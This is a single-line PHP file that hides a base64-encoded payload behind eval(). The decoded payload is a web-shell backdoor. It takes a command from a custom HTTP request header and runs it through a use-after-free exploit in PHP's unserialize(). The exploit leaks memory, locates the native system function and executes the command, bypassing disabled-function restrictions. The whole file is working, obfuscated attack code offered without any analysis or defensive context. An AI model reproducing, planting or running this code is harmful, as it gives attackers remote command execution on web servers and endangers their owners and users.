<?php eval(base64_decode("CgoKcHduKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfQUlaQVdBX05JTkpBJ10pKTsKCgpmdW5jdGlvbiBwd24oJGNtZCkgewogICAgZ2xvYmFsICRhYmMsICRoZWxwZXI7CgogICAgZnVuY3Rpb24gc3RyMnB0cigmJHN0ciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICAkYWRkcmVzcyA9IDA7CiAgICAgICAgZm9yKCRqID0gJHMtMTsgJGogPj0gMDsgJGotLSkgewogICAgICAgICAgICAkYWRkcmVzcyA8PD0gODsKICAgICAgICAgICAgJGFkZHJlc3MgfD0gb3JkKCRzdHJbJHArJGpdKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRhZGRyZXNzOwogICAgfQoKICAgIGZ1bmN0aW9uIHB0cjJzdHIoJHB0ciwgJG0gPSA4KSB7CiAgICAgICAgJG91dCA9ICIiOwogICAgICAgIGZvciAoJGk9MDsgJGkgPCAkbTsgJGkrKykgewogICAgICAgICAgICAkb3V0IC49IGNocigkcHRyICYgMHhmZik7CiAgICAgICAgICAgICRwdHIgPj49IDg7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkb3V0OwogICAgfQoKICAgIGZ1bmN0aW9uIHdyaXRlKCYkc3RyLCAkcCwgJHYsICRuID0gOCkgewogICAgICAgICRpID0gMDsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRuOyAkaSsrKSB7CiAgICAgICAgICAgICRzdHJbJHAgKyAkaV0gPSBjaHIoJHYgJiAweGZmKTsKICAgICAgICAgICAgJHYgPj49IDg7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGxlYWsoJGFkZHIsICRwID0gMCwgJHMgPSA4KSB7CiAgICAgICAgZ2xvYmFsICRhYmMsICRoZWxwZXI7CiAgICAgICAgd3JpdGUoJGFiYywgMHg2OCwgJGFkZHIgKyAkcCAtIDB4MTApOwogICAgICAgICRsZWFrID0gc3RybGVuKCRoZWxwZXItPmEpOwogICAgICAgIGlmKCRzICE9IDgpIHsgJGxlYWsgJT0gMiA8PCAoJHMgKiA4KSAtIDE7IH0KICAgICAgICByZXR1cm4gJGxlYWs7CiAgICB9CgogICAgZnVuY3Rpb24gcGFyc2VfZWxmKCRiYXNlKSB7CiAgICAgICAgJGVfdHlwZSA9IGxlYWsoJGJhc2UsIDB4MTAsIDIpOwoKICAgICAgICAkZV9waG9mZiA9IGxlYWsoJGJhc2UsIDB4MjApOwogICAgICAgICRlX3BoZW50c2l6ZSA9IGxlYWsoJGJhc2UsIDB4MzYsIDIpOwogICAgICAgICRlX3BobnVtID0gbGVhaygkYmFzZSwgMHgzOCwgMik7CgogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJGVfcGhudW07ICRpKyspIHsKICAgICAgICAgICAgJGhlYWRlciA9ICRiYXNlICsgJGVfcGhvZmYgKyAkaSAqICRlX3BoZW50c2l6ZTsKICAgICAgICAgICAgJHBfdHlwZSAgPSBsZWFrKCRoZWFkZXIsIDAsIDQpOwogICAgICAgICAgICAkcF9mbGFncyA9IGxlYWsoJGhlYWRlciwgNCwgNCk7CiAgICAgICAgICAgICRwX3ZhZGRyID0gbGVhaygkaGVhZGVyLCAweDEwKTsKICAgICAgICAgICAgJHBfbWVtc3ogPSBsZWFrKCRoZWFkZXIsIDB4MjgpOwoKICAgICAgICAgICAgaWYoJHBfdHlwZSA9PSAxICYmICRwX2ZsYWdzID09IDYpIHsgCiAgICAgICAgICAgICAgICAkZGF0YV9hZGRyID0gJGVfdHlwZSA9PSAyID8gJHBfdmFkZHIgOiAkYmFzZSArICRwX3ZhZGRyOwogICAgICAgICAgICAgICAgJGRhdGFfc2l6ZSA9ICRwX21lbXN6OwogICAgICAgICAgICB9IGVsc2UgaWYoJHBfdHlwZSA9PSAxICYmICRwX2ZsYWdzID09IDUpIHsgCiAgICAgICAgICAgICAgICAkdGV4dF9zaXplID0gJHBfbWVtc3o7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmKCEkZGF0YV9hZGRyIHx8ICEkdGV4dF9zaXplIHx8ICEkZGF0YV9zaXplKQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CgogICAgICAgIHJldHVybiBbJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZV07CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSB7CiAgICAgICAgbGlzdCgkZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplKSA9ICRlbGY7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZGF0YV9zaXplIC8gODsgJGkrKykgewogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgJGkgKiA4KTsKICAgICAgICAgICAgaWYoJGxlYWsgLSAkYmFzZSA+IDAgJiYgJGxlYWsgLSAkYmFzZSA8ICRkYXRhX2FkZHIgLSAkYmFzZSkgewogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7CiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3NDZlNjE3NDczNmU2ZjYzKQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9IGVsc2UgY29udGludWU7CgogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgKCRpICsgNCkgKiA4KTsKICAgICAgICAgICAgaWYoJGxlYWsgLSAkYmFzZSA+IDAgJiYgJGxlYWsgLSAkYmFzZSA8ICRkYXRhX2FkZHIgLSAkYmFzZSkgewogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7CiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3ODY1NjgzMjZlNjk2MikKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfSBlbHNlIGNvbnRpbnVlOwoKICAgICAgICAgICAgcmV0dXJuICRkYXRhX2FkZHIgKyAkaSAqIDg7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspIHsKICAgICAgICAkYmFzZSA9IDA7CiAgICAgICAgJHN0YXJ0ID0gJGJpbmFyeV9sZWFrICYgMHhmZmZmZmZmZmZmZmZmMDAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMDAwOyAkaSsrKSB7CiAgICAgICAgICAgICRhZGRyID0gJHN0YXJ0IC0gMHgxMDAwICogJGk7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkYWRkciwgMCwgNyk7CiAgICAgICAgICAgIGlmKCRsZWFrID09IDB4MTAxMDI0NjRjNDU3ZikgeyAKICAgICAgICAgICAgICAgIHJldHVybiAkYWRkcjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgewogICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgIGRvIHsKICAgICAgICAgICAgJGZfZW50cnkgPSBsZWFrKCRhZGRyKTsKICAgICAgICAgICAgJGZfbmFtZSA9IGxlYWsoJGZfZW50cnksIDAsIDYpOwoKICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyAKICAgICAgICAgICAgICAgIHJldHVybiBsZWFrKCRhZGRyICsgOCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsKICAgICAgICB9IHdoaWxlKCRmX2VudHJ5ICE9IDApOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBjbGFzcyByeWF0IHsKICAgICAgICB2YXIgJHJ5YXQ7CiAgICAgICAgdmFyICRjaHRnOwogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKQogICAgICAgIHsKICAgICAgICAgICAgJHRoaXMtPmNodGcgPSAkdGhpcy0+cnlhdDsKICAgICAgICAgICAgJHRoaXMtPnJ5YXQgPSAxOwogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBIZWxwZXIgewogICAgICAgIHB1YmxpYyAkYSwgJGIsICRjLCAkZDsKICAgIH0KCiAgICBpZihzdHJpc3RyKFBIUF9PUywgJ1dJTicpKSB7CiAgICAgICAgZGllKCdUaGlzIFBvQyBpcyBmb3IgKm5peCBzeXN0ZW1zIG9ubHkuJyk7CiAgICB9CgogICAgJG5fYWxsb2MgPSAxMDsKCiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3JlcGVhdCgnQScsIDc5KTsKCiAgICAkcG9jID0gJ2E6NDp7aTowO2k6MTtpOjE7YToxOntpOjA7Tzo0OiJyeWF0IjoyOntzOjQ6InJ5YXQiO1I6MztzOjQ6ImNodGciO2k6Mjt9fWk6MTtpOjM7aToyO1I6NTt9JzsKICAgICRvdXQgPSB1bnNlcmlhbGl6ZSgkcG9jKTsKICAgIGdjX2NvbGxlY3RfY3ljbGVzKCk7CgogICAgJHYgPSBbXTsKICAgICR2WzBdID0gcHRyMnN0cigwLCA3OSk7CiAgICB1bnNldCgkdik7CiAgICAkYWJjID0gJG91dFsyXVswXTsKCiAgICAkaGVscGVyID0gbmV3IEhlbHBlcjsKICAgICRoZWxwZXItPmIgPSBmdW5jdGlvbiAoJHgpIHsgfTsKCiAgICBpZihzdHJsZW4oJGFiYykgPT0gNzkgfHwgc3RybGVuKCRhYmMpID09IDApIHsKICAgICAgICBkaWUoIlVBRiBmYWlsZWQiKTsKICAgIH0KCiAgICAkY2xvc3VyZV9oYW5kbGVycyA9IHN0cjJwdHIoJGFiYywgMCk7CiAgICAkcGhwX2hlYXAgPSBzdHIycHRyKCRhYmMsIDB4NTgpOwogICAgJGFiY19hZGRyID0gJHBocF9oZWFwIC0gMHhjODsKCiAgICB3cml0ZSgkYWJjLCAweDYwLCAyKTsKICAgIHdyaXRlKCRhYmMsIDB4NzAsIDYpOwoKICAgIHdyaXRlKCRhYmMsIDB4MTAsICRhYmNfYWRkciArIDB4NjApOwogICAgd3JpdGUoJGFiYywgMHgxOCwgMHhhKTsKCiAgICAkY2xvc3VyZV9vYmogPSBzdHIycHRyKCRhYmMsIDB4MjApOwoKICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOwogICAgaWYoISgkYmFzZSA9IGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCRlbGYgPSBwYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOwogICAgfQoKICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGdldCBiYXNpY19mdW5jdGlvbnMgYWRkcmVzcyIpOwogICAgfQoKICAgIGlmKCEoJHppZl9zeXN0ZW0gPSBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICB9CgogICAgJGZha2Vfb2JqX29mZnNldCA9IDB4ZDA7CiAgICBmb3IoJGkgPSAwOyAkaSA8IDB4MTEwOyAkaSArPSA4KSB7CiAgICAgICAgd3JpdGUoJGFiYywgJGZha2Vfb2JqX29mZnNldCArICRpLCBsZWFrKCRjbG9zdXJlX29iaiwgJGkpKTsKICAgIH0KCiAgICB3cml0ZSgkYWJjLCAweDIwLCAkYWJjX2FkZHIgKyAkZmFrZV9vYmpfb2Zmc2V0KTsKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDM4LCAxLCA0KTsKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDY4LCAkemlmX3N5c3RlbSk7IAoKICAgICgkaGVscGVyLT5iKSgkY21kKTsKCiAgICBleGl0KCk7Cn0="));?>